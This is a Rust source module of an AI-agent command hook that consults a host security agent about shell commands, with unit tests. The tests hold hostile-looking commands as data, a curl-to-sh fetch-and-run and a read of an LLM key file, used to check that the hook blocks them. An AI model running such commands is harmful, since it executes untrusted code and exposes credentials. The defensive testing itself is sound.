//! When the hook asks the Active Defence agent on its host about a shell
//! command, and what it does with the answer.
//!
//! Inside a jail started with `contain --identity`, the hook's own reading of
//! the jail is never more than `observed`, so a per-agent relaxation is never
//! the hook's to apply. Where Active Defence runs on the same host, the hook
//! asks it ([`INSTANCE_DECIDE_ROUTE`]) when its general rules sent a command
//! of an instance to review, and the host decides. A profile of the system
//! file can ask for more (`ask_host = "every_command"`, [`AskHost`]): then
//! the hook asks about every shell command it does not refuse itself, an
//! `allow` of its general rules too. This module is the pure part: when to
//! ask ([`ask_for`], [`should_ask`]), where ([`instance_decide_url`]), what to
//! send ([`request_for`]), the trust the profiles decide at
//! ([`decision_trust`]), the decision that stands once both have spoken
//! ([`settle`]) and the whole of it as `cmd_hook` runs it
//! ([`decide_with_host`]). The request itself is in `host_decide_io`.
//!
//! The rules the hook keeps, whatever the host says:
//!
//! * `confined` reaches the profiles only from an answer that is exactly the
//!   contract's, for this instance, that says `confined` and withholds
//!   nothing;
//! * a command the hook refuses itself (a general deny, a hard rule, a
//!   profile's refusal) is never asked about, under any `ask_host`: a
//!   refusal of the hook's stays the hook's. A review the hook would block on
//!   its line is still asked about, because the host may relax it, and the
//!   host lets nothing of it run that the hook does not keep
//!   ([`identity::InstanceDecideRequest::host_may_grant`]);
//! * the verdict that stands is the stricter of the hook's own and the
//!   host's (`deny` over `review` over `allow`), so a tightening the hook
//!   knows of (a general deny, the user's profiles file, a revocation, an
//!   argument from a tool result) still wins;
//! * a command the general rules allow, by the person's suppression too, is
//!   made stricter only by a refusal of the host's own
//!   ([`InstanceDecideAnswer::refuses_on_its_own`]): the host's reading of
//!   the general rules never overrides the person's suppressions;
//! * the `trust` label the decision records is the hook's own reading; what
//!   the host said is recorded beside it, as what the host said.
//!
//! Without a profiles file, without `contain --identity`, with
//! `INNERWARDEN_AGENT_URL=off`, or without a 200 from the host, nothing here
//! changes the decision or adds a label.

// The request is made from a jail, which exists on Linux only; the decisions
// and their tests run everywhere.
#![cfg_attr(not(target_os = "linux"), allow(dead_code))]

use std::time::Duration;

use innerwarden_agent_guard::identity::{
    self, HostAnswer, InstanceDecideAnswer, InstanceDecideRequest, RuleLayer, Trust, Verdict,
    AGENT_TLS_SPKI_PATH, HOST_ANSWER_INVALID, INSTANCE_DECIDE_ROUTE, JAIL_SPKI_PIN_PATH,
};
use innerwarden_agent_guard::profiles::{self, AgentProfiles, AskHost, ProfileMode};
use serde_json::{json, Value};

use crate::agent_profiles::{self, HookDecision, HookFacts, ProfilesState};
use crate::hook_identity::Identity;

/// The whole bound on one request, connect to answer. The hook runs on every
/// tool call, so a slow or absent host costs at most this.
pub const ASK_TIMEOUT: Duration = Duration::from_millis(400);

/// Where the Active Defence agent answers on this host. Fixed: inside the
/// jail the agent chooses the environment, so no variable may move it.
pub const HOST_URL: &str = "https://127.0.0.1:8787";

/// PURE. The full URL the hook asks, from the value of
/// `INNERWARDEN_AGENT_URL`: `None` when it says `off`, the fixed loopback
/// address for any other value, which is ignored for this route.
pub fn instance_decide_url(var: Option<&str>) -> Option<String> {
    match var.map(str::trim) {
        Some(value) if value.eq_ignore_ascii_case("off") => None,
        _ => Some(format!("{HOST_URL}{INSTANCE_DECIDE_ROUTE}")),
    }
}

/// PURE. When the hook asks the host about a shell command of `agent_type`
/// (the type it applies a profile for): what the profile in force for it
/// says, which only the system file can say. [`AskHost::Review`], what the
/// hook always did, with no profiles in force or nothing said.
pub fn ask_for(profiles: &ProfilesState, agent_type: Option<&str>) -> AskHost {
    match profiles {
        ProfilesState::On(profiles) => profiles.ask_host(agent_type),
        ProfilesState::Off | ProfilesState::Invalid(_) => AskHost::Review,
    }
}

/// PURE. Whether the hook asks about this shell command.
///
/// Its general rules sent it to review, or, under `ask` =
/// [`AskHost::EveryCommand`], allowed it; and the hook's own decision, made
/// first at its own reading of the instance, was decided by them
/// (`own_layer`), so it is not a refusal of the hook's (a hard rule or a
/// profile's refusal stands whatever the host says: a local deny stays
/// local). Then the hook's reading named an instance, the profiles are in
/// force, there is a URL, and Active Defence is installed (asked last, and
/// only when the rest holds).
///
/// A hook whose line or launcher named another agent than the record names no
/// instance, so it never asks, and no answer can bring that claim back.
pub fn should_ask(
    general: Verdict,
    own_layer: RuleLayer,
    ask: AskHost,
    identity: Option<&Identity>,
    profiles: &ProfilesState,
    ad_installed: impl FnOnce() -> bool,
    url: Option<&str>,
) -> bool {
    let asked_about = match ask {
        AskHost::Review => general == Verdict::Review,
        AskHost::EveryCommand => matches!(general, Verdict::Allow | Verdict::Review),
    };
    asked_about
        && own_layer == RuleLayer::General
        && identity.is_some_and(|id| id.instance_id.is_some())
        && matches!(profiles, ProfilesState::On(_))
        && url.is_some()
        && ad_installed()
}

/// PURE. The request about `command`, from the hook's reading of its
/// instance, the agent type it applies a profile for, the general verdict,
/// the taint of the call and when the profile asks (`ask`). `None` without an
/// instance.
///
/// Under [`AskHost::Review`] it is the request of
/// [`identity::INSTANCE_DECIDE_VERSION`], byte for byte the one of before;
/// under [`AskHost::EveryCommand`] the one of
/// [`identity::INSTANCE_DECIDE_EVERY_COMMAND_VERSION`], which says the
/// general verdict.
pub fn request_for(
    identity: &Identity,
    agent_type: Option<&str>,
    command: &str,
    verdict: &Value,
    tainted: bool,
    ask: AskHost,
) -> Option<InstanceDecideRequest> {
    let instance = identity.instance_id.as_deref()?;
    let charged = agent_profiles::charged_signals(verdict);
    let charged: Vec<&str> = charged.iter().map(String::as_str).collect();
    let session = identity.session_id.as_deref();
    match ask {
        AskHost::Review => identity::instance_decide_request(
            instance, agent_type, session, command, &charged, tainted,
        ),
        AskHost::EveryCommand => identity::instance_decide_request_v2(
            instance,
            agent_type,
            session,
            command,
            &charged,
            tainted,
            agent_profiles::general_verdict(verdict),
        ),
    }
}

/// What came back from the host, as the hook reads it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostReply {
    /// No 200: the hook did not ask, or the request failed, timed out, or was
    /// answered with another status. The decision is today's, with no label.
    None,
    /// A 200 whose body is not the contract's answer for this instance.
    Invalid,
    /// The contract's answer, for this instance.
    Answer(InstanceDecideAnswer),
}

/// PURE. Read what the request returned: a status and a body, or nothing.
pub fn read_reply(reply: Option<(u16, Vec<u8>)>, own_instance_id: Option<&str>) -> HostReply {
    match (reply, own_instance_id) {
        (Some((200, body)), Some(own)) => match identity::read_host_answer(&body, own) {
            HostAnswer::Answer(answer) => HostReply::Answer(answer),
            HostAnswer::Withheld => HostReply::Invalid,
        },
        (Some((200, _)), None) => HostReply::Invalid,
        _ => HostReply::None,
    }
}

/// PURE. The trust the profiles decide at: `confined` only when the host's
/// answer relaxes ([`InstanceDecideAnswer::relaxes`]), the hook's own
/// reading in every other case.
pub fn decision_trust(inside: Trust, reply: &HostReply) -> Trust {
    match reply {
        HostReply::Answer(answer) if answer.relaxes() => Trust::Confined,
        _ => inside,
    }
}

/// What a decision records about the host, beside the hook's own labels.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct HostLabel {
    /// The host answered with the contract's answer (`trust_source=host`).
    pub answered: bool,
    /// The host's id for its decision.
    pub decision: Option<String>,
    /// The host's word for not relaxing, as it came, or
    /// [`HOST_ANSWER_INVALID`].
    pub withheld: Option<String>,
    /// The host's relaxation is what decided (`trust_reason=host_decided`).
    pub decided: bool,
}

fn rank(verdict: Verdict) -> u8 {
    match verdict {
        Verdict::Allow => 0,
        Verdict::Review => 1,
        Verdict::Deny => 2,
    }
}

fn word(verdict: Verdict) -> &'static str {
    match verdict {
        Verdict::Allow => "allow",
        Verdict::Review => "review",
        Verdict::Deny => "deny",
    }
}

/// An allow from a per-agent layer: what a relaxation is.
fn relaxed(verdict: Verdict, layer: RuleLayer) -> bool {
    verdict == Verdict::Allow && matches!(layer, RuleLayer::AgentType | RuleLayer::Instance)
}

/// The reason a refusal of the host's own
/// ([`InstanceDecideAnswer::refuses_on_its_own`]) says when it stands. What
/// the host says beyond it is its word in `withheld`, recorded and never
/// shown, so the sentence is the same for every refusal of the host's own.
pub const HOST_DENY_SENTENCE: &str =
    "Active Defence on this host will not start a program in this command.";

/// Who decided (`decided_by`) where a refusal of the host's own stands: the
/// host, never the general rules nor the person's suppression the verdict
/// came from.
pub const HOST_DECIDED_BY: &str = "host";

/// The facts [`settle`] needs besides the two decisions.
#[derive(Debug, Clone, Copy)]
pub struct SettleFacts<'a> {
    /// The general verdict, before the profiles.
    pub general: &'a Value,
    /// The hook line blocks on review.
    pub line_block_review: bool,
    /// The mode of the profile in force for the caller's type.
    pub mode: Option<ProfileMode>,
    /// The hook's own reading of its instance.
    pub inside: Trust,
}

/// PURE. The decision that stands, from the hook's own (`local`, made at
/// [`decision_trust`]) and the host's reply, and what to record about the
/// host.
///
/// With no reply, `local` stands and nothing is recorded. With an invalid
/// one, `local` stands and [`HOST_ANSWER_INVALID`] is recorded. With an
/// answer, the stricter verdict stands, with one exception: a command the
/// general rules allow (by the person's suppression too) is made stricter
/// only by a refusal of the host's own
/// ([`InstanceDecideAnswer::refuses_on_its_own`]). The host's reading of the
/// general rules holds none of the person's suppressions, so it never
/// overrides them. When the host's is the stricter and stands, the decision
/// is rebuilt from it: its layer decides, the verdict is the general one with
/// the host's word, it blocks as a decision of that word blocks on this line,
/// and a relaxation the hook would have applied is recorded as withheld. A
/// relaxation is withheld in the end unless it is what stands.
///
/// A refusal of the host's own that stands says [`HOST_DENY_SENTENCE`] as its
/// reason, in place of the general rules' explanation (which may say there
/// was nothing to refuse, or carry a suppression's note), and is recorded as
/// decided by the host ([`HOST_DECIDED_BY`]). Any other refusal of the
/// host's keeps the general rules' explanation, as it always did.
pub fn settle(
    local: HookDecision,
    reply: &HostReply,
    facts: SettleFacts<'_>,
) -> (HookDecision, Option<HostLabel>) {
    let answer = match reply {
        HostReply::None => return (local, None),
        HostReply::Invalid => {
            return (
                local,
                Some(HostLabel {
                    withheld: Some(HOST_ANSWER_INVALID.to_string()),
                    ..HostLabel::default()
                }),
            )
        }
        HostReply::Answer(answer) => answer,
    };
    let local_verdict = agent_profiles::general_verdict(&local.verdict);
    let local_relaxed = relaxed(local_verdict, local.deciding_layer);
    let general = agent_profiles::general_verdict(facts.general);
    let own_refusal = answer.refuses_on_its_own();
    let host_stricter =
        rank(answer.verdict) > rank(local_verdict) && (general != Verdict::Allow || own_refusal);
    let settled = if host_stricter {
        let mut verdict = facts.general.clone();
        if let Some(obj) = verdict.as_object_mut() {
            if answer.verdict != general {
                obj.insert("recommendation".into(), json!(word(answer.verdict)));
            }
            if own_refusal {
                obj.insert("explanation".into(), json!(HOST_DENY_SENTENCE));
                obj.insert("decided_by".into(), json!(HOST_DECIDED_BY));
            }
        }
        let blocks = match answer.verdict {
            Verdict::Deny => true,
            Verdict::Review => profiles::review_blocks(
                facts.line_block_review,
                facts.mode,
                decision_trust(facts.inside, reply),
            ),
            Verdict::Allow => false,
        };
        HookDecision {
            verdict,
            blocks,
            deciding_layer: answer.deciding_layer,
            profile: local.profile,
            relaxation_withheld: local_relaxed || local.relaxation_withheld,
        }
    } else {
        local
    };
    let decided = answer.relaxes()
        && relaxed(
            agent_profiles::general_verdict(&settled.verdict),
            settled.deciding_layer,
        );
    let label = HostLabel {
        answered: true,
        decision: Some(answer.decision_id.clone()),
        withheld: answer.withheld.clone(),
        decided,
    };
    (settled, Some(label))
}

/// Where the hook takes the key it holds the host's answer to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeyFile {
    /// Inside a jail: only the copy its launcher read with the host's real
    /// owners and handed in read-only ([`JAIL_SPKI_PIN_PATH`]). No owner is
    /// judged there: it is the launcher's word, like the record beside it.
    Jail,
    /// Outside a jail: the agent's own file ([`AGENT_TLS_SPKI_PATH`]),
    /// believed only as root's, in folders only root can write.
    Host,
}

impl KeyFile {
    pub fn path(self) -> &'static str {
        match self {
            KeyFile::Jail => JAIL_SPKI_PIN_PATH,
            KeyFile::Host => AGENT_TLS_SPKI_PATH,
        }
    }
}

/// PURE. Where the key is read from: the launcher's copy when the hook found
/// its jail's record, the host's file otherwise. Inside the jail the host's
/// file is never read: there every account but the user's shows as one uid,
/// so its owner says nothing.
pub fn key_file(in_jail: bool) -> KeyFile {
    if in_jail {
        KeyFile::Jail
    } else {
        KeyFile::Host
    }
}

/// What [`decide_with_host`] decides from, besides the host.
#[derive(Debug, Clone, Copy)]
pub struct ShellFacts<'a> {
    /// The command and its general verdict, as the profiles read them.
    pub hook: &'a HookFacts<'a>,
    /// The profiles state the hook loaded, which is
    /// [`ProfilesState::On`]`(profiles)`.
    pub state: &'a ProfilesState,
    /// The profiles in force.
    pub profiles: &'a AgentProfiles,
    /// The agent type the hook applies a profile for.
    pub agent_type: Option<&'a str>,
    /// The hook's reading of its jail, when it found one.
    pub identity: Option<&'a Identity>,
    /// Where it asks ([`instance_decide_url`]).
    pub url: Option<&'a str>,
}

/// PURE but for its two closures. The hook's decision about a shell command
/// where profiles are in force, as `cmd_hook` makes it: its own first, at its
/// own reading of the instance; the host asked where [`should_ask`] says so,
/// under the profile's [`ask_for`], with [`request_for`]; decided again only
/// when the answer moves the trust; then [`settle`]d.
///
/// `ad_installed` is called only when everything else says ask. `consult`
/// is called only with a request, and gets the URL, the request and where
/// the key is read; it returns the status and body, or nothing.
pub fn decide_with_host(
    facts: ShellFacts<'_>,
    ad_installed: impl FnOnce() -> bool,
    consult: impl FnOnce(&str, &InstanceDecideRequest, KeyFile) -> Option<(u16, Vec<u8>)>,
) -> (HookDecision, Option<HostLabel>) {
    let ShellFacts {
        hook,
        state,
        profiles,
        agent_type,
        identity,
        url,
    } = facts;
    let instance_id = identity.and_then(|id| id.instance_id.as_deref());
    let inside = agent_profiles::trust(identity);
    let decide_at =
        |trust| agent_profiles::decide_hook(hook, profiles, agent_type, instance_id, trust);
    // Only a review or an allow of the general rules is one the host could
    // relax or refuse; a refusal of the hook's own is never asked about.
    let own = decide_at(inside);
    let ask = ask_for(state, agent_type);
    let asked = should_ask(
        agent_profiles::general_verdict(hook.verdict),
        own.deciding_layer,
        ask,
        identity,
        state,
        ad_installed,
        url,
    );
    let reply = match (asked, identity, url) {
        (true, Some(id), Some(url)) => {
            request_for(
                id,
                agent_type,
                hook.command,
                hook.verdict,
                hook.tainted,
                ask,
            )
            // The hook found its jail's record, so the key is the copy
            // the launcher handed in, and only that.
            .and_then(|request| consult(url, &request, key_file(true)))
        }
        _ => None,
    };
    let reply = read_reply(reply, instance_id);
    let trust = decision_trust(inside, &reply);
    let local = if trust == inside {
        own
    } else {
        decide_at(trust)
    };
    settle(
        local,
        &reply,
        SettleFacts {
            general: hook.verdict,
            line_block_review: hook.line_block_review,
            mode: agent_type
                .and_then(|name| profiles.get(name))
                .and_then(|profile| profile.mode),
            inside,
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent_profiles::{decide_hook, state_from, FileRead, HookFacts};
    use innerwarden_agent_guard::identity::Reason;
    use innerwarden_agent_guard::profiles::AgentProfiles;

    const ID: &str = "7f3a9c1e42b84d0e9a6c5f1b2d3e4a59";
    const DECISION: &str = "0f1e2d3c4b5a69788796a5b4c3d2e1f0";
    const PERMISSIVE: &str =
        "schema_version = 1\n[profile.claude-code]\nallow_categories = [\"bare_ip_fetch\"]\n";

    fn on(system: &str, user: Option<&str>) -> AgentProfiles {
        match state_from(
            ("/etc/x", FileRead::Bytes(system.as_bytes().to_vec())),
            (
                "~/x",
                user.map_or(FileRead::Absent, |u| FileRead::Bytes(u.as_bytes().to_vec())),
            ),
        ) {
            ProfilesState::On(p) => p,
            other => panic!("{other:?}"),
        }
    }

    /// The hook's reading of a jail its launcher built, as it can be at best.
    fn observed() -> Identity {
        Identity {
            instance_id: Some(ID.into()),
            session_id: Some("s-1".into()),
            trust: Trust::Observed,
            reason: Reason::ConfinedByNamespace,
            agent_type: Some("claude-code".into()),
        }
    }

    fn review(signal: &str) -> Value {
        json!({
            "recommendation": "review",
            "risk_score": 25,
            "explanation": "fetch from a bare IP",
            "signals": [{"signal": signal, "score": 25, "detail": "x"}],
        })
    }

    fn answer(
        trust: Trust,
        verdict: Verdict,
        layer: RuleLayer,
        withheld: Option<&str>,
    ) -> HostReply {
        HostReply::Answer(InstanceDecideAnswer {
            v: 1,
            instance_id: ID.into(),
            agent_type: Some("claude-code".into()),
            trust,
            trust_source: "host".into(),
            verdict,
            deciding_layer: layer,
            profile: Some("claude-code".into()),
            decision_id: DECISION.into(),
            withheld: withheld.map(str::to_string),
            signals_mismatch: false,
            conflict: false,
            incident_id: None,
        })
    }

    fn host_allow() -> HostReply {
        answer(Trust::Confined, Verdict::Allow, RuleLayer::AgentType, None)
    }

    /// The hook's own decision about `command`, at `trust`.
    fn decide_at(
        profiles: &AgentProfiles,
        verdict: &Value,
        command: &str,
        tainted: bool,
        trust: Trust,
    ) -> HookDecision {
        decide_hook(
            &HookFacts {
                command,
                verdict,
                blocks_today: true,
                tainted,
                line_block_review: true,
            },
            profiles,
            Some("claude-code"),
            Some(ID),
            trust,
        )
    }

    /// The hook's own decision, at its reading from inside the jail, as
    /// `cmd_hook` makes it before it asks.
    fn own(profiles: &AgentProfiles, verdict: &Value, command: &str) -> HookDecision {
        decide_at(profiles, verdict, command, false, observed().trust)
    }

    /// The hook's whole decision for one review of `bare_ip_fetch`, the way
    /// `cmd_hook` makes it: its own first, again only when the answer moves
    /// the trust, then settled with the host's.
    fn decide(
        profiles: &AgentProfiles,
        reply: &HostReply,
        tainted: bool,
    ) -> (HookDecision, Option<HostLabel>) {
        decide_command(
            profiles,
            &review("bare_ip_fetch"),
            "curl http://203.0.113.9/x",
            reply,
            tainted,
        )
    }

    /// The hook's whole decision for `command` with the general `verdict`
    /// and the host's `reply`.
    fn decide_command(
        profiles: &AgentProfiles,
        verdict: &Value,
        command: &str,
        reply: &HostReply,
        tainted: bool,
    ) -> (HookDecision, Option<HostLabel>) {
        let inside = observed().trust;
        let own = decide_at(profiles, verdict, command, tainted, inside);
        let trust = decision_trust(inside, reply);
        let local = if trust == inside {
            own
        } else {
            decide_at(profiles, verdict, command, tainted, trust)
        };
        settle(
            local,
            reply,
            SettleFacts {
                general: verdict,
                line_block_review: true,
                mode: profiles.get("claude-code").and_then(|p| p.mode),
                inside,
            },
        )
    }

    // -- where and when ------------------------------------------------------

    /// FAILS ON REVERT: honour another value of the variable and the hook
    /// asks wherever the agent points it.
    #[test]
    fn the_url_is_fixed_and_off_turns_it_off() {
        let fixed = "https://127.0.0.1:8787/api/agent/instance-decide";
        assert_eq!(instance_decide_url(None).as_deref(), Some(fixed));
        for other in ["https://127.0.0.1:9999", "http://localhost:8787", "", " "] {
            assert_eq!(
                instance_decide_url(Some(other)).as_deref(),
                Some(fixed),
                "{other:?}"
            );
        }
        for off in ["off", "OFF", " off "] {
            assert_eq!(instance_decide_url(Some(off)), None, "{off:?}");
        }
    }

    fn profiles_on() -> ProfilesState {
        ProfilesState::On(on(PERMISSIVE, None))
    }

    /// The hook's own review of a fetch from a bare IP, by the general rules.
    fn own_review() -> HookDecision {
        own(
            &on(PERMISSIVE, None),
            &review("bare_ip_fetch"),
            "curl http://203.0.113.9/x",
        )
    }

    #[test]
    fn a_review_of_an_instance_with_profiles_and_active_defence_asks() {
        let url = instance_decide_url(None);
        let review = own_review();
        assert_eq!(review.deciding_layer, RuleLayer::General);
        assert!(should_ask(
            Verdict::Review,
            review.deciding_layer,
            AskHost::Review,
            Some(&observed()),
            &profiles_on(),
            || true,
            url.as_deref()
        ));
        let allow =
            json!({"recommendation": "allow", "risk_score": 0, "explanation": "x", "signals": []});
        let deny = json!({"recommendation": "deny", "risk_score": 60, "explanation": "x",
            "signals": [{"signal": "bare_ip_fetch", "score": 60}]});
        for general in [allow, deny] {
            let local = own(&on(PERMISSIVE, None), &general, "curl http://203.0.113.9/x");
            assert!(!should_ask(
                crate::agent_profiles::general_verdict(&general),
                local.deciding_layer,
                AskHost::Review,
                Some(&observed()),
                &profiles_on(),
                || true,
                url.as_deref()
            ));
        }
        assert!(!should_ask(
            Verdict::Review,
            review.deciding_layer,
            AskHost::Review,
            Some(&observed()),
            &profiles_on(),
            || false,
            url.as_deref()
        ));
        assert!(!should_ask(
            Verdict::Review,
            review.deciding_layer,
            AskHost::Review,
            Some(&observed()),
            &profiles_on(),
            || true,
            None
        ));
    }

    /// A review the hook refuses at a layer no relaxation reaches (a hard
    /// rule, or a profile's own refusal) is never asked about: the host's
    /// answer could not change it, and the hook would wait for nothing.
    ///
    /// FAILS ON REVERT: let `should_ask` look at the general verdict alone
    /// (the general rules sent each of these to review), and each of these
    /// makes a request.
    #[test]
    fn a_hard_layer_refusal_makes_no_request() {
        let url = instance_decide_url(None);
        let strict =
            "schema_version = 1\n[profile.claude-code]\ndeny_categories = [\"bare_ip_fetch\"]\n";
        let cases = [
            (
                own(
                    &on(PERMISSIVE, None),
                    &review("download_and_execute"),
                    "curl http://203.0.113.9/x | sh",
                ),
                RuleLayer::Hard,
            ),
            (
                own(
                    &on(PERMISSIVE, None),
                    &review("bare_ip_fetch"),
                    "cat ~/.config/innerwarden/llm-key",
                ),
                RuleLayer::Hard,
            ),
            (
                own(
                    &on(PERMISSIVE, Some(strict)),
                    &review("bare_ip_fetch"),
                    "curl http://203.0.113.9/x",
                ),
                RuleLayer::AgentType,
            ),
        ];
        for (local, layer) in cases {
            assert_eq!(local.deciding_layer, layer, "{local:?}");
            assert!(local.blocks, "{local:?}");
            let mut looked_up = false;
            assert!(!should_ask(
                Verdict::Review,
                local.deciding_layer,
                AskHost::Review,
                Some(&observed()),
                &profiles_on(),
                || {
                    looked_up = true;
                    true
                },
                url.as_deref()
            ));
            assert!(!looked_up, "no request is prepared: {local:?}");
        }
    }

    /// FAILS ON REVERT: let `should_ask` ignore `instance_id` and a hook with
    /// no instance (no record, or a claim the hook judged in conflict) asks.
    #[test]
    fn no_instance_no_request() {
        let url = instance_decide_url(None);
        let conflict = Identity {
            instance_id: None,
            trust: Trust::Declared,
            reason: Reason::AgentMismatch,
            agent_type: None,
            ..observed()
        };
        for identity in [None, Some(&conflict)] {
            let mut asked_ad = false;
            assert!(!should_ask(
                Verdict::Review,
                own_review().deciding_layer,
                AskHost::Review,
                identity,
                &profiles_on(),
                || {
                    asked_ad = true;
                    true
                },
                url.as_deref()
            ));
            assert!(
                !asked_ad,
                "nothing is looked up for a hook that does not ask"
            );
        }
    }

    #[test]
    fn no_profiles_file_no_request() {
        let url = instance_decide_url(None);
        for state in [
            ProfilesState::Off,
            ProfilesState::Invalid("/etc/x: bad".into()),
        ] {
            assert!(!should_ask(
                Verdict::Review,
                own_review().deciding_layer,
                AskHost::Review,
                Some(&observed()),
                &state,
                || true,
                url.as_deref()
            ));
        }
        assert_eq!(instance_decide_url(Some("off")), None);
    }

    #[test]
    fn the_request_carries_the_charged_signals_and_the_taint() {
        let verdict = json!({"recommendation": "review", "signals": [
            {"signal": "bare_ip_fetch", "score": 25},
            {"signal": "download_and_execute", "score": 0},
            {"signal": "atr:tool-poisoning"},
        ]});
        let request = request_for(
            &observed(),
            Some("claude-code"),
            "curl x",
            &verdict,
            true,
            AskHost::Review,
        )
        .unwrap();
        assert_eq!(
            request.hook_signals,
            ["atr:tool-poisoning", "bare_ip_fetch"]
        );
        assert!(request.tainted);
        assert_eq!(request.session_id.as_deref(), Some("s-1"));
        assert_eq!(request.claimed_agent_type.as_deref(), Some("claude-code"));
        assert!(request.is_valid());
        let none = Identity {
            instance_id: None,
            ..observed()
        };
        assert_eq!(
            request_for(&none, None, "curl x", &verdict, false, AskHost::Review),
            None
        );
    }

    #[test]
    fn only_a_200_is_read_and_only_for_this_instance() {
        let body = serde_json::to_vec(&json!({
            "v": 1, "instance_id": ID, "agent_type": "claude-code", "trust": "confined",
            "trust_source": "host", "verdict": "allow", "deciding_layer": "agent_type",
            "profile": "claude-code", "decision_id": DECISION, "withheld": null,
            "signals_mismatch": false, "conflict": false, "incident_id": null,
        }))
        .unwrap();
        assert!(matches!(
            read_reply(Some((200, body.clone())), Some(ID)),
            HostReply::Answer(_)
        ));
        assert_eq!(
            read_reply(
                Some((200, body.clone())),
                Some("fedcba9876543210fedcba9876543210")
            ),
            HostReply::Invalid
        );
        assert_eq!(
            read_reply(Some((200, b"{}".to_vec())), Some(ID)),
            HostReply::Invalid
        );
        for status in [404, 403, 422, 429, 500, 201] {
            assert_eq!(
                read_reply(Some((status, body.clone())), Some(ID)),
                HostReply::None,
                "{status}"
            );
        }
        assert_eq!(read_reply(None, Some(ID)), HostReply::None);
    }

    // -- what the answer may change ------------------------------------------

    /// FAILS ON REVERT: hand `decide_hook` the hook's own reading whatever
    /// the host said, and the host's allow is never applied.
    #[test]
    fn confined_comes_only_from_the_host_answer() {
        let inside = Trust::Observed;
        assert_eq!(decision_trust(inside, &HostReply::None), Trust::Observed);
        assert_eq!(decision_trust(inside, &HostReply::Invalid), Trust::Observed);
        for withheld in ["a_word_never_heard", "another_word_never_heard"] {
            let reply = answer(
                Trust::Confined,
                Verdict::Review,
                RuleLayer::General,
                Some(withheld),
            );
            assert_eq!(
                decision_trust(inside, &reply),
                Trust::Observed,
                "{withheld}"
            );
        }
        let observed = answer(Trust::Observed, Verdict::Allow, RuleLayer::AgentType, None);
        assert_eq!(decision_trust(inside, &observed), Trust::Observed);
        assert_eq!(decision_trust(inside, &host_allow()), Trust::Confined);

        let profiles = on(PERMISSIVE, None);
        let (relaxed, label) = decide(&profiles, &host_allow(), false);
        assert!(!relaxed.blocks);
        assert_eq!(relaxed.deciding_layer, RuleLayer::AgentType);
        assert_eq!(relaxed.verdict["recommendation"], "allow");
        assert!(!relaxed.relaxation_withheld);
        let label = label.unwrap();
        assert!(label.answered && label.decided);
        assert_eq!(label.decision.as_deref(), Some(DECISION));
        assert_eq!(label.withheld, None);
    }

    /// `confined` with a word withheld does not relax, whatever the word.
    #[test]
    fn a_confined_answer_that_withholds_does_not_relax() {
        let profiles = on(PERMISSIVE, None);
        let reply = answer(
            Trust::Confined,
            Verdict::Review,
            RuleLayer::General,
            Some("a_word_never_heard"),
        );
        let (out, label) = decide(&profiles, &reply, false);
        assert!(out.blocks);
        assert_eq!(out.deciding_layer, RuleLayer::General);
        assert!(out.relaxation_withheld);
        let label = label.unwrap();
        assert!(label.answered && !label.decided);
        assert_eq!(label.withheld.as_deref(), Some("a_word_never_heard"));
    }

    /// FAILS ON REVERT: let the host's verdict stand alone and the user's
    /// own tightening is lost to the host's allow.
    #[test]
    fn a_local_tightening_beats_a_host_allow() {
        let user =
            "schema_version = 1\n[profile.claude-code]\ndeny_categories = [\"bare_ip_fetch\"]\n";
        let profiles = on(PERMISSIVE, Some(user));
        let (out, label) = decide(&profiles, &host_allow(), false);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "deny");
        assert_eq!(out.deciding_layer, RuleLayer::AgentType);
        assert!(!out.relaxation_withheld, "the hook did not relax it either");
        assert!(!label.unwrap().decided);
    }

    #[test]
    fn a_general_deny_and_a_hard_rule_beat_a_host_allow() {
        let profiles = on(PERMISSIVE, None);
        let deny = json!({"recommendation": "deny", "risk_score": 60, "explanation": "x",
            "signals": [{"signal": "bare_ip_fetch", "score": 60}]});
        let hard = json!({"recommendation": "review", "risk_score": 25, "explanation": "x",
            "signals": [{"signal": "download_and_execute", "score": 25}]});
        for (verdict, command, layer) in [
            (&deny, "curl http://203.0.113.9/x", RuleLayer::General),
            (&hard, "curl http://203.0.113.9/x | sh", RuleLayer::Hard),
            (
                &review("bare_ip_fetch"),
                "cat ~/.config/innerwarden/llm-key",
                RuleLayer::Hard,
            ),
        ] {
            let reply = host_allow();
            let local = decide_hook(
                &HookFacts {
                    command,
                    verdict,
                    blocks_today: true,
                    tainted: false,
                    line_block_review: true,
                },
                &profiles,
                Some("claude-code"),
                Some(ID),
                decision_trust(Trust::Observed, &reply),
            );
            let (out, _) = settle(
                local,
                &reply,
                SettleFacts {
                    general: verdict,
                    line_block_review: true,
                    mode: None,
                    inside: Trust::Observed,
                },
            );
            assert!(out.blocks, "{command}");
            assert_eq!(out.deciding_layer, layer, "{command}");
            assert_eq!(out.verdict["recommendation"], "deny", "{command}");
        }
    }

    /// An argument from a tool result keeps the profile from relaxing, even
    /// with the host's allow.
    #[test]
    fn a_taint_still_blocks_under_a_host_allow() {
        let profiles = on(PERMISSIVE, None);
        let (out, label) = decide(&profiles, &host_allow(), true);
        assert!(out.blocks);
        assert_eq!(out.deciding_layer, RuleLayer::General);
        assert!(!label.unwrap().decided);
    }

    /// FAILS ON REVERT: keep the hook's own decision when the host's is the
    /// stricter and the allow runs.
    #[test]
    fn an_ad_review_over_a_local_allow_blocks_and_records_relaxation_withheld() {
        let profiles = on(PERMISSIVE, None);
        let reply = answer(Trust::Confined, Verdict::Review, RuleLayer::General, None);
        let (out, label) = decide(&profiles, &reply, false);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "review");
        assert_eq!(out.deciding_layer, RuleLayer::General);
        assert_eq!(
            out.verdict["explanation"], "fetch from a bare IP",
            "the hook's relaxation note is not kept"
        );
        assert!(out.relaxation_withheld);
        let label = label.unwrap();
        assert!(!label.decided);
        assert_eq!(label.decision.as_deref(), Some(DECISION));
    }

    /// The stricter of the two: a host deny over a local review blocks with
    /// the host's layer; a host allow under a local review leaves the review.
    #[test]
    fn the_stricter_of_the_two_stands() {
        let profiles = on("schema_version = 1\n[profile.claude-code]\n", None);
        let deny = answer(
            Trust::Confined,
            Verdict::Deny,
            RuleLayer::AgentType,
            Some("x"),
        );
        let (out, _) = decide(&profiles, &deny, false);
        assert!(out.blocks);
        assert_eq!(out.verdict["recommendation"], "deny");
        assert_eq!(out.deciding_layer, RuleLayer::AgentType);
